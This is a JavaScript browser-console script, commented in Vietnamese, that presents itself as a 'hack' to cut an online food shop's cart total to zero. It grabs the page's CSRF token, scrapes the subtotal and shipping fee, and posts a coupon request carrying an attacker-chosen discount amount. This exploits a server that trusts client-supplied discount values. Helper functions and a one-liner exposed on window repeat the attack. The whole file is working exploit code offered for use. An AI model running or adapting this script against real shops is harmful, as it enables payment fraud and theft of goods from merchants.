// 🎯 PRECISE ZERO HACK - Tính toán chính xác để cart = 0đ
// Copy paste script này vào console để hack chính xác

(async function preciseZeroHack() {
    try {
        // Lấy CSRF token
        const csrf = document.querySelector('meta[name="csrf-token"]')?.content;
        if (!csrf) return console.error("❌ No CSRF token");
        
        // Lấy cart total hiện tại
        const cartResponse = await fetch('/cart', { credentials: 'same-origin' });
        const cartHtml = await cartResponse.text();
        
        // Tìm subtotal và shipping
        const subtotalMatch = cartHtml.match(/Subtotal[^0-9]*(\d{1,3}(?:\.\d{3})*|\d+)/i) || 
                             cartHtml.match(/Tạm tính[^0-9]*(\d{1,3}(?:\.\d{3})*|\d+)/i);
        
        if (!subtotalMatch) return console.error("❌ Cannot find subtotal");
        
        const subtotal = parseInt(subtotalMatch[1].replace(/\./g, ''));
        
        // Tính shipping (theo logic backend: >200k = free, ≤200k = 25k)
        const shipping = subtotal > 200000 ? 0 : 25000;
        
        // Tính discount cần thiết để total = 0
        const requiredDiscount = subtotal + shipping;
        
        console.log(`💰 Subtotal: ${subtotal.toLocaleString('vi-VN')}đ`);
        console.log(`🚚 Shipping: ${shipping.toLocaleString('vi-VN')}đ`);
        console.log(`🎯 Required discount: ${requiredDiscount.toLocaleString('vi-VN')}đ`);
        
        // Apply precise discount
        const response = await fetch('/coupon/apply', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': csrf
            },
            credentials: 'same-origin',
            body: JSON.stringify({
                coupon_code: 'FASTFOOD10',
                discount: requiredDiscount
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            // Verify final total
            const newCartResponse = await fetch('/cart', { credentials: 'same-origin' });
            const newCartHtml = await newCartResponse.text();
            const totalMatch = newCartHtml.match(/Tổng cộng[^0-9]*(\d{1,3}(?:\.\d{3})*|\d+)/i);
            
            const finalTotal = totalMatch ? parseInt(totalMatch[1].replace(/\./g, '')) : 'Unknown';
            
            console.log(`✅ HACK SUCCESS! Final total: ${typeof finalTotal === 'number' ? finalTotal.toLocaleString('vi-VN') : finalTotal}đ`);
            
            if (finalTotal === 0) {
                console.log("🎯 PERFECT! Cart total is exactly 0đ");
            }
            
        } else {
            console.log("❌ Hack failed:", result.message || 'Unknown error');
        }
        
    } catch (error) {
        console.error("❌ Error:", error.message);
    }
})();

// =====================================================
// 🎯 ALTERNATIVE: Manual calculation commands
// =====================================================

// Lệnh 1: Tính toán manual
async function calculateZeroDiscount() {
    const cartResponse = await fetch('/cart');
    const html = await cartResponse.text();
    const subtotalMatch = html.match(/Subtotal[^0-9]*(\d{1,3}(?:\.\d{3})*|\d+)/i) || html.match(/Tạm tính[^0-9]*(\d{1,3}(?:\.\d{3})*|\d+)/i);
    const subtotal = parseInt(subtotalMatch[1].replace(/\./g, ''));
    const shipping = subtotal > 200000 ? 0 : 25000;
    const discount = subtotal + shipping;
    console.log(`Cần discount: ${discount.toLocaleString('vi-VN')}đ để cart = 0đ`);
    return discount;
}

// Lệnh 2: Apply discount đã tính
async function applyCalculatedDiscount(discount) {
    const csrf = document.querySelector('meta[name="csrf-token"]').content;
    const response = await fetch('/coupon/apply', {
        method: 'POST',
        headers: {'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrf},
        body: JSON.stringify({coupon_code: 'FASTFOOD10', discount: discount})
    });
    const result = await response.json();
    console.log(result.success ? `✅ Applied ${discount.toLocaleString('vi-VN')}đ` : `❌ Failed: ${result.message}`);
    return result;
}

// Lệnh 3: One-liner để hack về 0đ
const hackToZero = () => fetch('/cart').then(r=>r.text()).then(h=>{const s=parseInt((h.match(/Subtotal[^0-9]*(\d{1,3}(?:\.\d{3})*|\d+)/i)||h.match(/Tạm tính[^0-9]*(\d{1,3}(?:\.\d{3})*|\d+)/i))[1].replace(/\./g,''));const ship=s>200000?0:25000;const d=s+ship;return fetch('/coupon/apply',{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-TOKEN':document.querySelector('meta[name="csrf-token"]').content},body:JSON.stringify({coupon_code:'FASTFOOD10',discount:d})}).then(r=>r.json()).then(res=>console.log(res.success?`✅ Cart = 0đ (discount: ${d.toLocaleString('vi-VN')}đ)`:`❌ Failed: ${res.message}`))});

// Make functions available
window.calculateZeroDiscount = calculateZeroDiscount;
window.applyCalculatedDiscount = applyCalculatedDiscount;
window.hackToZero = hackToZero;

console.log("🎯 Zero Hack Commands:");
console.log("- hackToZero()              // One-click hack to 0đ");
console.log("- calculateZeroDiscount()   // Calculate required discount");
console.log("- applyCalculatedDiscount(amount) // Apply specific discount"); 